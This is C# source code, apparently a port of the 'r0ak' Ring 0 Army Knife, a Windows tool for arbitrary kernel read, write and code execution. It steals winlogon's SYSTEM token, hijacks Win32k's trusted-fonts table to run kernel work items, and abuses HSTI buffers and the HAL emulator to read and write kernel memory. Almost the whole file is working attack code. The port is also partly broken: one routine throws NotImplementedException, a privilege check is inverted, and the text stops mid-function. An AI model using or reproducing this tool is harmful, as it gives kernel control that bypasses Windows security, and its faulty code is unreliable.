﻿using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

using Microsoft.Win32;

namespace R0aCkS
{
    internal class Program
    {
        static unsafe Program()
        {
            byte[] rdtscAsm = new byte[] {
                0x0F, 0x31, // rdtsc
                0xC3        // ret
            };
            IntPtr assemblyCode = (IntPtr)(void*)Natives.VirtualAlloc(UIntPtr.Zero, (uint)rdtscAsm.Length,
                0x1000 /* MEM_COMMIT */, 0x40 /* PAGE_EXECUTE_READWRITE */);
            Marshal.Copy(rdtscAsm, 0, assemblyCode, rdtscAsm.Length);
            Rdtsc = Marshal.GetDelegateForFunctionPointer<RdtscDelegate>(assemblyCode);
        }

        internal static unsafe bool CmdExecuteKernel(KERNEL_EXECUTE KernelExecute, UIntPtr FunctionPointer, UIntPtr FunctionParameter)
        {
            // Initialize a work item for the caller-supplied function and argument
            Console.WriteLine("[+] Calling function pointer 0x{0}", FunctionPointer);
            if (!KernelExecuteSetCallback(KernelExecute, FunctionPointer, FunctionParameter)) {
                Console.WriteLine("[-] Failed to initialize work item trampoline");
                return false;
            }
            // Begin ETW tracing to look for the work item executing
            ETW_DATA etwData = new ETW_DATA();
            if (!EtwStartSession(&etwData, FunctionPointer)) {
                Console.WriteLine("[-] Failed to start ETW trace");
                return false;
            }
            // Execute it!
            if (!KernelExecuteRun(KernelExecute)) {
                Console.WriteLine("[-] Failed to execute work item");
                return false;
            }
            // Wait for execution to finish
            if (!EtwParseSession(etwData)) {
                // We have no idea if execution finished -- block forever
                Console.WriteLine("[-] Failed to parse ETW trace");
                Thread.Sleep(TimeSpan.MaxValue);
            }
            return true;
        }

        internal static bool CmdParseInputParameters(string[] Arguments, out UIntPtr Function,
            out ulong FunctionArgument)
        {
            Function = UIntPtr.Zero;
            FunctionArgument = 0;

            // Check if the user passed in a module!function instead
            ulong rawAddress;
            if (ulong.TryParse(Arguments[1], out rawAddress)) {
                Function = new UIntPtr(rawAddress);
            }
            else { 
                // Separate out the module name from the symbol name
                string functionNameAndModule = Arguments[1];
                string[] splitted = functionNameAndModule.Split(new char[] { '!' },
                    StringSplitOptions.RemoveEmptyEntries);
                if (2 != splitted.Length) {
                    Console.WriteLine("[-] Malformed symbol string: {0}", Arguments[1]);
                    return false;
                }
                // Now get the remaining function name
                string functionName = splitted[1];
                string moduleName = functionNameAndModule;
                // Get the symbol requested
                Function = SymLookup(moduleName, functionName);
                if (UIntPtr.Zero == Function) {
                    Console.WriteLine("[-] Could not find symbol!");
                    return false;
                }
            }
            // Return the data back
            if (ulong.TryParse(Arguments[2], out rawAddress)) {
                FunctionArgument = rawAddress;
            }
            return true;
        }

        private static unsafe bool CmdReadKernel(KERNEL_EXECUTE KernelExecute, void* KernelAddress, uint ValueSize)
        {
            // First, set the size that the user wants
            Console.WriteLine("[+] Setting size to                                      0x{0:X16}", ValueSize);
            if (!CmdWriteKernel(KernelExecute, (void*)g_HstiBufferSize, ValueSize)) {
                Console.WriteLine("[-] Fail to set size");
                return false;
            }
            // Then, set the pointer -- our write is 32-bits so we do it in 2 steps
            Console.WriteLine("[+] Setting pointer to                                   0x{0:X16}\n",
                (UIntPtr)KernelAddress);
            if (!CmdWriteKernel(KernelExecute, (void*)g_HstiBufferPointer, (uint)((ulong)KernelAddress & 0xFFFFFFFF))) {
                Console.WriteLine("[-] Fail to set lower pointer bits");
                return false;
            }
            if (!CmdWriteKernel(KernelExecute, (void*)((ulong)g_HstiBufferPointer + 4), (uint)((ulong)KernelAddress >> 32))) {
                Console.WriteLine("[-] Fail to set lower pointer bits");
                return false;
            }
            // Allocate a buffer for the data in user space
            UIntPtr userData = Natives.VirtualAlloc(UIntPtr.Zero, ValueSize, 0x00003000 /* MEM_COMMIT | MEM_RESERVE*/,
                4 /*PAGE_READWRITE*/);
            if (null == userData) {
                Console.WriteLine("[-] Failed to allocate user mode buffer\n");
                return false;
            }
            // Now do the read by abusing the HSTI buffers
            uint returnength;
            uint status = Natives.NtQuerySystemInformation(SystemHardwareSecurityTestInterfaceResultsInformation,
                userData, ValueSize, out returnength);
            if (0 != status) {
                Console.WriteLine("[-] Failed to read kernel data");
            }
            else {
                DumpHex((void*)userData, ValueSize);
            }
            // Free the buffer and exit
            Natives.VirtualFree(userData, 0, 0x8000 /*MEM_RELEASE*/);
            return (0 <= status);
        }


        private static unsafe bool CmdWriteKernel(KERNEL_EXECUTE KernelExecute, void* KernelAddress, uint KernelValue)
        {
            //PKERNEL_ALLOC kernelAlloc;
            //PXM_CONTEXT xmContext;
            //BOOL b;
            //PETW_DATA etwData;

            // Trace operation
            Console.WriteLine("[+] Writing 0x{0:X8} to                                0x{1:X16}",
                KernelValue, (UIntPtr)KernelAddress);
            // Allocate an XM_CONTEXT to drive the HAL x64 emulator
            KERNEL_ALLOC kernelAlloc = new KERNEL_ALLOC();
            XM_CONTEXT* xmContext = (XM_CONTEXT*)KernelAlloc(kernelAlloc, (uint)Marshal.SizeOf<XM_CONTEXT>());
            if (null == xmContext) {
                Console.WriteLine("[-] Failed to allocate memory for XM_CONTEXT\n");
                return false;
            }
            // Fill it out
            xmContext->SourceValue = KernelValue;
            xmContext->DataType = XM_OPERATION_DATATYPE.LONG_DATA;
            xmContext->DestinationPointer = (UIntPtr)KernelAddress;
            // Make a kernel copy of it
            xmContext = (XM_CONTEXT*)KernelWrite(&kernelAlloc);
            if (null == xmContext) {
                Console.WriteLine("[-] Failed to find kernel memory for XM_CONTEXT\n");
                // KernelFree(&kernelAlloc);
                return false;
            }
            // Setup the work item
            if (!KernelExecuteSetCallback(KernelExecute, g_XmFunction, (UIntPtr)(&xmContext))) {
                Console.WriteLine("[-] Failed to initialize work item!\n");
                // KernelFree(kernelAlloc);
                return false;
            }
            // Begin ETW tracing to look for the work item executing
            ETW_DATA etwData = new ETW_DATA();
            if (!EtwStartSession(&etwData, g_XmFunction)) {
                Console.WriteLine("[-] Failed to start ETW trace\n");
                // KernelFree(kernelAlloc);
                return false;
            }
            // Run it!
            if (!KernelExecuteRun(KernelExecute)) {
                Console.WriteLine("[-] Failed to execute kernel function!\n");
            }
            else {
                // Wait for execution to finish
                if (!EtwParseSession(etwData)) {
                    // We have no idea if execution finished -- block forever
                    Console.WriteLine("[-] Failed to parse ETW trace\n");
                    Thread.Sleep(int.MaxValue);
                    return false;
                }
            }
            // Free the allocation since this path either failed or completed execution
            // KernelFree(kernelAlloc);
            return true;
        }

        private static bool IsPrintable(byte candidate)
        {
            return (Char.IsLetterOrDigit((char)candidate) || Char.IsPunctuation((char)candidate));
        }

        private static unsafe void DumpHex(void* Data, ulong Size)
        {
            const int asciiLength = 17;
            byte* ascii = stackalloc byte[asciiLength];

            // Parse each byte in the stream
            for(int index = 0; index < asciiLength; index++) {
                ascii[index] = 0;
            }
            for (ulong i = 0; i < Size; ++i) {
                // Every new line, print a TAB
                if ((i % 16) == 0) {
                    Console.Write("\t");
                }
                // Print the hex representation of the data
                Console.Write("{0:X2}", ((byte*)Data)[i]);
                // And as long as this isn't the middle dash, print a space
                if ((i + 1) % 16 != 8) {
                    Console.Write(" ");
                }
                else {
                    Console.Write("-");
                }
                // Is this a printable character? If not, use a '.' to represent it
                if (IsPrintable(((byte*)Data)[i])) {
                    ascii[i % 16] = ((byte*)Data)[i];
                }
                else {
                    ascii[i % 16] = (byte)'.';
                }
                // Is this end of the line? If so, print it out
                if (((i + 1) % 16) == 0) {
                    Console.WriteLine(" {0}", Encoding.ASCII.GetString(ascii, 16));
                }

                if ((i + 1) == Size) {
                    // We've reached the end of the buffer, keep printing spaces
                    // until we get to the end of the line
                    ascii[(i + 1) % 16] = 0;
                    for (ulong j = ((i + 1) % 16); j < 16; j++) {
                        Console.Write("   ");
                    }
                    Console.WriteLine(" {0}", Encoding.ASCII.GetString(ascii, (int)(16 - ((i + 1) % 16))));
                }
            }
        }

        internal static bool ElevateToSystem()
        {
            IntPtr hToken = IntPtr.Zero;
            IntPtr hNewtoken = IntPtr.Zero;
            int status;

            // Create toolhelp snaapshot
            IntPtr hSnapshot = Natives.CreateToolhelp32Snapshot(0x00000002 /*TH32CS_SNAPPROCESS*/, 0);
            if (IntPtr.Zero == hSnapshot) {
                Console.WriteLine("[-] Failed to initialize toolhelp snapshot: 0x{0:X8}", Marshal.GetLastWin32Error());
                return false;
            }
            // Scan process list
            uint logonPid = 0;
            IntPtr processEntry = IntPtr.Zero;
            try {
                int bufferSize = 1024;
                processEntry = Marshal.AllocCoTaskMem(bufferSize);
                Marshal.WriteInt32(processEntry, bufferSize);
                // processEntry.dwSize = sizeof(processEntry);
                if (Natives.Process32First(hSnapshot, processEntry)) {
                    do {
                        // Look for winlogon
                        // TODO : Check the offset.
                        throw new NotImplementedException();
                        //string processName = Marshal.PtrToStringUni(processEntry + 44);
                        //if (processName.Contains("winlogon.exe")) {
                        //    // Found it
                        //    logonPid = Marshal.ReadInt32(processEntry, 8 /*th32ProcessID*/);
                        //    break;
                        //}
                    } while (Natives.Process32Next(hSnapshot, processEntry));
                }
            }
            finally {
                if (IntPtr.Zero != processEntry) { Marshal.FreeCoTaskMem(processEntry); }
            }
            // Fail it not found
            if (logonPid == 0) {
                Console.WriteLine("[-] Couldn't find Winlogon.exe");
                return false;
            }

            // Enable debug privileges, so that we may open the processes we need
            bool old;
            if (0 <= (status = Natives.RtlAdjustPrivilege(0x00000014 /* SE_DEBUG_PRIVILEGE*/, true, false, out old))) {
                Console.WriteLine("[-] Failed to get SE_DEBUG_PRIVILEGE: 0x{0:X8}", status);
                return false;
            }

            // Open handle to it
            IntPtr hProcess = IntPtr.Zero;
            try {
                hProcess = Natives.OpenProcess(MAXIMUM_ALLOWED, false, logonPid);
                if (IntPtr.Zero == hProcess) {
                    Console.WriteLine("[-] Failed to open handle to Winlogon: 0x{0:8X}", Marshal.GetLastWin32Error());
                    return false;
                }
                // Open winlogon's token
                if (!Natives.OpenProcessToken(hProcess, MAXIMUM_ALLOWED, out hToken)) {
                    Console.WriteLine("[-] Failed to open Winlogon Token: 0x{0:8X}", Marshal.GetLastWin32Error());
                    return false;
                }
                // Make an impersonation token copy out of it
                if (!Natives.DuplicateToken(hToken, 2 /* SecurityImpersonation*/, out hNewtoken)) {
                    Console.WriteLine("[-] Failed to duplicate Winlogon Token: 0x{0:8X}", Marshal.GetLastWin32Error());
                    return false;
                }
                // And assign it as our thread token
                if(!Natives.SetThreadToken(IntPtr.Zero, hNewtoken)) {
                    Console.WriteLine("[-] Failed to impersonate Winlogon Token: 0x{0:8X}", Marshal.GetLastWin32Error());
                    return false;
                }
            }
            finally {
                // Close the handle to wininit, its token, and our copy
                if (IntPtr.Zero != hProcess) { Natives.CloseHandle(hProcess); }
                if (IntPtr.Zero != hToken) { Natives.CloseHandle(hToken); }
                if (IntPtr.Zero != hNewtoken) { Natives.CloseHandle(hNewtoken); }
            }
            return true;
        }

        private static unsafe void EtpEtwEventCallback(Natives.EVENT_RECORD* EventRecord)
        {
            ETW_DATA* etwData;

            // Look for an "end of work item execution event"
            if (EventRecord->EventHeader.EventDescriptor.Opcode ==
                (PERFINFO_LOG_TYPE_WORKER_THREAD_ITEM_END & 0xFF))
            {
                // Grab our context and check if the work routine matches ours
                etwData = (ETW_DATA*)EventRecord->UserContext;
                if ((UIntPtr)EventRecord->UserData == etwData->WorkItemRoutine) {
                    // Stop the trace -- this callback will run a few more times
                    Console.WriteLine("[+] Kernel finished executing work item at               0x{0:X16}",
                        etwData->WorkItemRoutine);
                    Natives.ControlTrace(etwData->SessionHandle, UIntPtr.Zero, etwData->Properties,
                        1 /* EVENT_TRACE_CONTROL_STOP*/);
                }
            }
        }

        private static unsafe bool EtwParseSession(ETW_DATA EtwData)
        {
            // Process the trace until the right work item is found
            uint errorCode;
            if (0 != (errorCode = Natives.ProcessTrace((IntPtr)(&EtwData.ParserHandle), 1, null, null))) {
                Console.WriteLine("[-] Failed to process trace: 0x{0:X}", errorCode);
                Natives.ControlTrace(EtwData.SessionHandle, UIntPtr.Zero, EtwData.Properties, 1 /* EVENT_TRACE_CONTROL_STOP*/);
            }
            // All done -- cleanup
            Natives.CloseTrace(EtwData.ParserHandle);
            Natives.HeapFree(Natives.GetProcessHeap(), 0, (UIntPtr)(&EtwData.Properties));
            Natives.HeapFree(Natives.GetProcessHeap(), 0, (UIntPtr)(&EtwData));
            return (0 == errorCode);
        }

        private static unsafe bool EtwStartSession(ETW_DATA* EtwData, UIntPtr WorkItemRoutine)
        {
            uint errorCode;
            int traceFlagsCount = 8;
            uint* traceFlags = stackalloc uint[traceFlagsCount];
            Natives.EVENT_TRACE_LOGFILE logFile = new Natives.EVENT_TRACE_LOGFILE();

            for(int index = 0; index < traceFlagsCount; index++) {
                traceFlags[index] = 0;
            }
            // Initialize context
            //*EtwData = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(**EtwData));
            //if (*EtwData == NULL)
            //{
            //    printf("[-] Out of memory allocating ETW state\n");
            //    return FALSE;
            //}

            // Allocate memory for our session descriptor
            uint bufferSize = (uint)(Marshal.SizeOf<Natives.EVENT_TRACE_PROPERTIES>() + Marshal.SizeOf(g_EtwTraceName));
            EtwData->Properties = (Natives.EVENT_TRACE_PROPERTIES*)Natives.HeapAlloc(Natives.GetProcessHeap(),
                0x00000008 /* HEAP_ZERO_MEMORY */, bufferSize);
            if (null == EtwData->Properties) {
                Console.WriteLine("[-] Failed to allocate memory for the ETW trace");
                // HeapFree(GetProcessHeap(), 0, *EtwData);
                return false;
            }

            // Create a real-time session using the system logger, tracing nothing
            EtwData->Properties->Wnode.BufferSize = bufferSize;
            EtwData->Properties->Wnode.Guid = g_EtwTraceGuid;
            EtwData->Properties->Wnode.ClientContext = 1;
            EtwData->Properties->Wnode.Flags = 0x00020000 /*WNODE_FLAG_TRACED_GUID*/;
            EtwData->Properties->MinimumBuffers = 1;
            EtwData->Properties->LogFileMode = 0x02000100 /* EVENT_TRACE_REAL_TIME_MODE | EVENT_TRACE_SYSTEM_LOGGER_MODE */;
            EtwData->Properties->FlushTimer = 1;
            EtwData->Properties->LoggerNameOffset = (uint)Marshal.SizeOf<Natives.EVENT_TRACE_PROPERTIES>();
            if (0 != (errorCode = Natives.StartTrace(out EtwData->SessionHandle, g_EtwTraceName, EtwData->Properties))) {
                Console.WriteLine("[-] Failed to create the event trace session: %lX\n", errorCode);
                Natives.HeapFree(Natives.GetProcessHeap(), 0, (UIntPtr)EtwData->Properties);
                //HeapFree(GetProcessHeap(), 0, *EtwData);
                return false;
            }
            // Open a consumer handle to it
            logFile.LoggerName = Marshal.StringToHGlobalUni(g_EtwTraceName);
            logFile.ProcessTraceMode = 0x10000100 /* PROCESS_TRACE_MODE_REAL_TIME | PROCESS_TRACE_MODE_EVENT_RECORD*/;
            logFile.EventRecordCallback = Marshal.GetFunctionPointerForDelegate<Natives.EventRecordCallbackDelegate>(EtpEtwEventCallback);
            logFile.Context = (UIntPtr)EtwData;
            EtwData->ParserHandle = Natives.OpenTrace(&logFile);
            if (EtwData->ParserHandle == Natives.InvalidHandle) {
                Console.WriteLine("[-] Failed open a consumer handle for the trace session: 0x{0:X}", Marshal.GetLastWin32Error());
                Natives.ControlTrace(EtwData->SessionHandle, UIntPtr.Zero, EtwData->Properties, 1 /* EVENT_TRACE_CONTROL_STOP*/);
                Natives.HeapFree(Natives.GetProcessHeap(), 0, (UIntPtr)EtwData->Properties);
                // HeapFree(GetProcessHeap(), 0, *EtwData);
                return false;
            }
            // Trace worker thread events
            traceFlags[2] = PERF_WORKER_THREAD;
            if (0 != Natives.TraceSetInformation(EtwData->SessionHandle, 4 /* TraceSystemTraceEnableFlagsInfo*/,
                (UIntPtr)traceFlags, (uint)traceFlagsCount * sizeof(uint)))
            {
                Console.WriteLine("[-] Failed to set flags for event trace session: 0x{0:X}", errorCode);
                Natives.ControlTrace(EtwData->SessionHandle, UIntPtr.Zero, EtwData->Properties, 1 /* EVENT_TRACE_CONTROL_STOP*/);
                Natives.CloseTrace(EtwData->ParserHandle);
                Natives.HeapFree(Natives.GetProcessHeap(), 0, (UIntPtr)EtwData->Properties);
                // HeapFree(GetProcessHeap(), 0, *EtwData);
                return false;
            }
            // Remember which work routine we'll be looking for
            EtwData->WorkItemRoutine = WorkItemRoutine;
            return true;
        }

        internal static UIntPtr GetDriverBaseAddr(string BaseName)
        {
            UIntPtr[] BaseAddresses = new UIntPtr[1024];
            uint cbNeeded;

            // Enumerate all the device drivers
            if (!Natives.EnumDeviceDrivers(BaseAddresses, (uint)(IntPtr.Size * BaseAddresses.Length), out cbNeeded)) {
                Console.WriteLine("[-] Failed to enumerate driver base addresses: 0x{0:8X}", Marshal.GetLastWin32Error());
                return UIntPtr.Zero;
            }
            IntPtr buffer = IntPtr.Zero;
            const int bufferLength = 260;
            try {
                buffer = Marshal.AllocHGlobal(bufferLength);
                // Go through each one
                for (int index = 0; index < (cbNeeded / IntPtr.Size); index++) {
                    // Get its name
                    if (0 == Natives.GetDeviceDriverBaseNameA(BaseAddresses[index], buffer, bufferLength)) {
                        Console.WriteLine("[-] Failed to get driver name: 0x{0:8X}", Marshal.GetLastWin32Error());
                        return UIntPtr.Zero;
                    }
                    // Compare it
                    string candidate = Marshal.PtrToStringAnsi(buffer);
                    if (0 == string.Compare(candidate, BaseName, true)) {
                        return BaseAddresses[index];
                    }
                }
            }
            finally {
                if (IntPtr.Zero != buffer) { Marshal.FreeHGlobal(buffer); }
            }
            return UIntPtr.Zero;
        }

        private static unsafe UIntPtr GetKernelAddress(uint Size)
        {
            // Allocate a large 32MB buffer to store pool tags in
            SYSTEM_BIGPOOL_INFORMATION* bigPoolInfo = (SYSTEM_BIGPOOL_INFORMATION*)Natives.VirtualAlloc(UIntPtr.Zero,
                POOL_TAG_FIXED_BUFFER, 0x00003000 /* MEM_COMMIT | MEM_RESERVE*/, 4 /*PAGE_READWRITE*/);
            if (null == bigPoolInfo) {
                Console.WriteLine("[-] No memory for pool buffer");
                return UIntPtr.Zero;
            }
            // Dump all pool tags
            uint resultLength;
            uint status = Natives.NtQuerySystemInformation(66 /* SystemBigPoolInformation*/, (UIntPtr)bigPoolInfo,
                POOL_TAG_FIXED_BUFFER, out resultLength);
            if (0 != status) {
                Console.WriteLine("[-] Failed to dump pool allocations: 0x{0:X}", status);
                return UIntPtr.Zero;
            }
            // Scroll through them all
            UIntPtr resultAddress;
            uint i;
            for (resultAddress = UIntPtr.Zero, i = 0; i < bigPoolInfo->Count; i++) {
                // Check for the desired allocation
                SYSTEM_BIGPOOL_ENTRY* entry = &bigPoolInfo->AllocatedInfo + i;
                if (entry->TagUlong == NPFS_DATA_ENTRY_POOL_TAG) {
                    // With the Heap-Backed Pool in RS5/19H1, sizes are precise, while
                    // the large pool allocator uses page-aligned pages
                    if ((entry->SizeInBytes == (Size + PAGE_SIZE)) ||
                        (entry->SizeInBytes == (Size + NPFS_DATA_ENTRY_SIZE)))
                    {
                        // Mask out the nonpaged pool bit
                        resultAddress = (UIntPtr)((ulong)entry->VirtualAddress & (ulong.MaxValue - 1)); // ~1;
                        break;
                    }
                }
            }
            // Weird..
            if (UIntPtr.Zero == resultAddress) {
                Console.WriteLine("[-] Kernel buffer not found!");
                return UIntPtr.Zero;
            }
            // Free the buffer
            Natives.VirtualFree((UIntPtr)bigPoolInfo, 0, 0x8000 /*MEM_RELEASE*/);
            return (resultAddress + (int)NPFS_DATA_ENTRY_SIZE);
        }

        internal static unsafe UIntPtr KernelAlloc(KERNEL_ALLOC KernelAlloc, uint Size)
        {
            // Only support < 2KB allocations
            // KernelAlloc = null;
            if (Size > 2048) {
                return UIntPtr.Zero;
            }
            // Allocate our tracker structure
            //*KernelAlloc = Natives.HeapAlloc(Natives.GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(**KernelAlloc));
            //if (null == KernelAlloc) {
            //    return UIntPtr.Zero;
            //}
            // Compute a magic size to get something in big pool that should be unique
            // This will use at most ~5MB of non-paged pool
            KernelAlloc.MagicSize = 0;
            while (0 == KernelAlloc.MagicSize) {
                KernelAlloc.MagicSize = (uint)(((Rdtsc() & 0xFF000000) >> 24) * 0x5000);
            }
            // Allocate the right child page that will be sent to the trampoline
            KernelAlloc.UserBase = Natives.VirtualAlloc(UIntPtr.Zero, KernelAlloc.MagicSize,
                0x00003000 /* MEM_COMMIT | MEM_RESERVE*/, 4 /*PAGE_READWRITE*/);
            if (UIntPtr.Zero == KernelAlloc.UserBase) {
                Console.WriteLine("[-] Failed to allocate user-mode memory for kernel buffer");
                return UIntPtr.Zero;
            }
            // Allocate a pipe to hold on to the buffer
            if (!Natives.CreatePipe(out KernelAlloc.Pipe0, out KernelAlloc.Pipe1, UIntPtr.Zero, KernelAlloc.MagicSize)) {
                Console.WriteLine("[-] Failed creating the pipe: 0x{0:X16}", Marshal.GetLastWin32Error());
                return UIntPtr.Zero;
            }
            // Return the allocated user-mode base
            return KernelAlloc.UserBase;
        }

        private static unsafe bool KernelExecuteRun(KERNEL_EXECUTE KernelExecute)
        {
            // Remember original pointer
            RTL_AVL_TABLE* realTable = KernelExecute.Globals->TrustedFontsTable;
            // Remove arial, which is our target font
            if (!Natives.RemoveFontResourceExW(@"C:\windows\fonts\arial.ttf", 0, UIntPtr.Zero)) {
                Console.WriteLine("[-] Failed to remove font: 0x{0:X}", Marshal.GetLastWin32Error());
                return false;
            }
            // Save the original trusted font file table and overwrite it with our own.
            RTL_AVL_TABLE* fakeTable = (RTL_AVL_TABLE*)((KernelExecute.Globals) + 1);
            fakeTable->BalancedRoot.RightChild = KernelExecute.TrampolineParameter;
            KernelExecute.Globals->TrustedFontsTable = fakeTable;
            // Set our priority to 4, the theory being that this should force the work
            // item to execute even on a single-processor core
            Natives.SetThreadPriority(Natives.GetCurrentThread(), 0x00010000 /* THREAD_MODE_BACKGROUND_BEGIN*/);
            // Add a font -- Win32k.sys will check if it's in the trusted path,
            // triggering the AVL search. This will trigger the execute.
            if (0 == Natives.AddFontResourceExW(@"C:\windows\fonts\arial.ttf", 0, UIntPtr.Zero)) {
                Console.WriteLine("[-] Failed to add font: 0x{0:X}", Marshal.GetLastWin32Error());
            }
            // Restore original pointer and thread priority
            KernelExecute.Globals->TrustedFontsTable = realTable;
            Natives.SetThreadPriority(Natives.GetCurrentThread(), 0x00020000 /*THREAD_MODE_BACKGROUND_END*/);
            return true;
        }

        internal static unsafe bool KernelExecuteSetCallback(KERNEL_EXECUTE KernelExecute,
            UIntPtr WorkFunction, UIntPtr WorkParameter)
        {
            CONTEXT_PAGE* contextBuffer;
            KERNEL_ALLOC kernelAlloc = new KERNEL_ALLOC();

            // Allocate the right child page that will be sent to the trampoline
            contextBuffer = (CONTEXT_PAGE*)KernelAlloc(kernelAlloc, (uint)Marshal.SizeOf<CONTEXT_PAGE>());
            if (null == contextBuffer) {
                Console.WriteLine("[-] Failed to allocate memory for WORK_QUEUE_ITEM");
                return false;
            }
            // Fill out the worker and its parameter
            contextBuffer->WorkItem.WorkerRoutine = WorkFunction;
            contextBuffer->WorkItem.Parameter = WorkParameter;
            // Write into the buffer
            contextBuffer = (CONTEXT_PAGE*)KernelWrite(&kernelAlloc);
            if (null == contextBuffer) {
                // KernelFree(kernelAlloc);
                Console.WriteLine("[-] Failed to find kernel memory for WORK_QUEUE_ITEM");
                return false;
            }
            // Return the balanced links with the appropriate work item
            KernelExecute.TrampolineAllocation = &kernelAlloc;
            KernelExecute.TrampolineParameter = &contextBuffer->Header;
            return true;
        }

        private static unsafe bool KernelExecuteSetup(KERNEL_EXECUTE KernelExecute, UIntPtr TrampolineFunction)
        {
            Natives.UNICODE_STRING name = new Natives.UNICODE_STRING();

            // Initialize the context
            // KernelExecute = new KERNEL_EXECUTE();
            //    (KERNEL_EXECUTE*)Natives.HeapAlloc(Natives.GetProcessHeap(), 0x00000008 /* HEAP_ZERO_MEMORY */,
            //    (uint)Marshal.SizeOf(typeof(KERNEL_EXECUTE)));
            //if (null == KernelExecute) {
            //    Console.WriteLine("[-] Out of memory allocating execution tracker");
            //    return false;
            //}
            // Get a SYSTEM token
            if (!ElevateToSystem()) {
                Console.WriteLine("[-] Failed to elevate to SYSTEM privileges");
                // Natives.HeapFree(Natives.GetProcessHeap(), 0, KernelExecute);
                return false;
            }
            // Open a handle to Win32k's cross-session globals section object
            Natives.RtlInitUnicodeString(ref name, @"\Win32kCrossSessionGlobals");
            Natives.OBJECT_ATTRIBUTES objectAttributes =
                new Natives.OBJECT_ATTRIBUTES(&name, 64 /* OBJ_CASE_INSENSITIVE */, IntPtr.Zero, IntPtr.Zero);
            IntPtr hFile;
            int status = Natives.ZwOpenSection(out hFile, MAXIMUM_ALLOWED, &objectAttributes);
            // We can drop impersonation now
            if (!Natives.RevertToSelf()) {
                // Not much to do but trace
                Console.WriteLine("[-] Failed to revert impersonation token: 0x{0:8X}", Marshal.GetLastWin32Error());
            }
            // Can't keep going if we couldn't get a handle to the section
            if (0 > status) {
                Console.WriteLine("[-] Couldn't open handle to kernel execution block: 0x{0:8X}", Marshal.GetLastWin32Error());
                Natives.CloseHandle(hFile);
                // Natives.HeapFree(Natives.GetProcessHeap(), 0, KernelExecute);
                return false;
            }
            // Map the section object in our address space
            KernelExecute.Globals = (XSGLOBALS*)Natives.MapViewOfFile(hFile, FILE_MAP_ALL_ACCESS, 0, 0,
                (ulong)Marshal.SizeOf(*(KernelExecute.Globals)));
            Natives.CloseHandle(hFile);
            if (null == KernelExecute.Globals) {
                Console.WriteLine("[-] Couldn't map kernel execution block: 0x{0:8X}", Marshal.GetLastWin32Error());
                // Natives.HeapFree(Natives.GetProcessHeap(), 0, KernelExecute);
                return false;
            }
            // Setup the table
            Console.WriteLine("[+] Mapped kernel execution block at                     0x{0:X16}",
                (IntPtr)KernelExecute.Globals);
            RTL_AVL_TABLE* fakeTable;
            fakeTable = (RTL_AVL_TABLE*)(KernelExecute.Globals + 1);
            fakeTable->DepthOfTree = 1;
            fakeTable->NumberGenericTableElements = 1;
            fakeTable->CompareRoutine = TrampolineFunction;
            return true;
        }

        private static unsafe void KernelExecuteTeardown(KERNEL_EXECUTE KernelExecute)
        {
            // Free the trampoline context
            KernelFree(KernelExecute.TrampolineAllocation);
            // Unmap the globals
            Natives.UnmapViewOfFile((IntPtr)KernelExecute.Globals);
        }

        internal static unsafe void KernelFree(KERNEL_ALLOC* allocation)
        {
            // Free the UM side of the allocation
            Natives.VirtualFree(allocation->UserBase, 0, 0x8000 /*MEM_RELEASE*/);
            // Close the pipes, which will free the kernel side
            Natives.CloseHandle(allocation->Pipe0);
            Natives.CloseHandle(allocation->Pipe1);
            // Free the structure
            Natives.HeapFree(Natives.GetProcessHeap(), 0, (UIntPtr)allocation);
        }

        private static unsafe UIntPtr KernelWrite(KERNEL_ALLOC* KernelAlloc)
        {
            // Write into the buffer
            uint bytesWriten;
            if (!Natives.WriteFile(KernelAlloc->Pipe1, KernelAlloc->UserBase, KernelAlloc->MagicSize, out bytesWriten, UIntPtr.Zero)) {
                Console.WriteLine("[-] Failed writing kernel buffer: 0x{0:X}", Marshal.GetLastWin32Error());
                return UIntPtr.Zero;
            }
            // Compute the kernel address and return it
            return (KernelAlloc->KernelBase = GetKernelAddress(KernelAlloc->MagicSize));
        }

        internal static unsafe int Main(string[] args)
        {
            ulong kernelValue;

            // Print header
            Console.WriteLine("r0aCkS v1.0.0 -- Ring 0 Army Knife");
            Console.WriteLine("Copyright (c) 2018 Alex Ionescu [@aionescu]");
            Console.WriteLine("http://www.windows-internals.com");
            Console.WriteLine();
            KERNEL_EXECUTE kernelExecute = new KERNEL_EXECUTE();

            try {
                if (3 != args.Length) {
                    Console.WriteLine("USAGE: r0ak.exe");
                    Console.WriteLine("       [--execute <Address | module!function> <Argument>]");
                    Console.WriteLine("       [--write   <Address | module!function> <Value>]");
                    Console.WriteLine("       [--read    <Address | module!function> <Size>]");
                    return -1;
                }
                // Initialize symbol engine
                if (!SymSetup()) {
                    Console.WriteLine("[-] Failed to initialize Symbol Engine");
                    return -1;
                }
                // Initialize our execution engine
                if (!KernelExecuteSetup(kernelExecute, g_TrampolineFunction)) {
                    Console.WriteLine("[-] Failed to setup Ring 0 execution engine");
                    return -1;
                }
                UIntPtr kernelPointer = UIntPtr.Zero;
                switch (args[0]) {
                    case "--execute":
                        // Get the initial inputs
                        if (!CmdParseInputParameters(args, out kernelPointer, out kernelValue)) {
                            return -1;
                        }
                        // Execute it
                        if (!CmdExecuteKernel(kernelExecute, kernelPointer, (UIntPtr)kernelValue)) {
                            Console.WriteLine("[-] Failed to execute function");
                            return -1;
                        }
                        // It's now safe to exit/cleanup state
                        Console.WriteLine("[+] Function executed successfuly!");
                        return 0;
                    case "--read":
                        // Get the initial inputs
                        if (!CmdParseInputParameters(args, out kernelPointer, out kernelValue)) {
                            return -1;
                        }
                        // Only 4GB of data can be read
                        if (kernelValue > uint.MaxValue) {
                            Console.WriteLine("[-] Invalid size, r0ak can only read up to 4GB of data");
                            return -1;
                        }
                        // Write it!
                        if (!CmdReadKernel(kernelExecute, (void*)kernelPointer, (uint)kernelValue)) {
                            Console.WriteLine("[-] Failed to read variable");
                            return -1;
                        }
                        // It's now safe to exit/cleanup state
                        Console.WriteLine("[+] Read executed successfuly!");
                        return 0;
                    case "--write":
                        // Get the initial inputs
                        if (!CmdParseInputParameters(args, out kernelPointer, out kernelValue)) {
                            return -1;
                        }
                        // Only 32-bit values can be written
                        if (kernelValue > uint.MaxValue) {
                            Console.WriteLine("[-] Invalid 64-bit value, r0ak only supports 32-bit");
                            return -1;
                        }
                        // Write it!
                        if (!CmdWriteKernel(kernelExecute, (void*)kernelPointer, (uint)kernelValue)) {
                            Console.WriteLine("[-] Failed to write variable");
                            return -1;
                        }
                        // It's now safe to exit/cleanup state
